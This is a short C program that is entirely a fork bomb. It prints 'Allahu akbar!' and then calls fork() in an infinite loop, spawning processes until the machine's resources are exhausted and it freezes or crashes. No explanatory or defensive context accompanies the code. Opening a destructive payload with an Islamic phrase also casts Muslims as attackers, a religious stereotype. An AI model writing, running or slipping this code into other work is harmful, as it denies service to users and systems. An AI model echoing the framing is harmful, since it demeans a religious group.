#include <stdio.h>
#include <unistd.h>

int main() {
    puts("Allahu akbar!");
    for (;;) {
        fork();
    }
    return 0;
}